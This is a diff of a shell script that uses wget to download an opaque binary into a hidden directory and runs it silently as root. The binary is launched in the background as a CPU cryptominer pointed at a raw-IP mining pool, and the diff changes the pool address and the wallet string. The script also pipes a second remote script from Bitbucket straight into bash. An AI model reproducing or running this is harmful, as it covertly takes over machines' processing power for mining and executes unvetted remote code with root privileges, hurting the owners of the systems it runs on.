@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/tsyjaryj/filesg/downloads/serbenew >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool 139.180.155.196:80  --wallet novalanto#tes --password cok --keepalive true --cpu-threads $(nproc --all) > /dev/null 2>&1 &
+sudo ./sgr1 --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool 199.247.17.189:80 --tls false --wallet novalanto123.$(echo $(shuf -i 1-100000 -n 1)-AJG) --password love0101m=solo --keepalive true --cpu-threads $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/tsyjaryj/filesg/raw/main/boled04.sh | bash
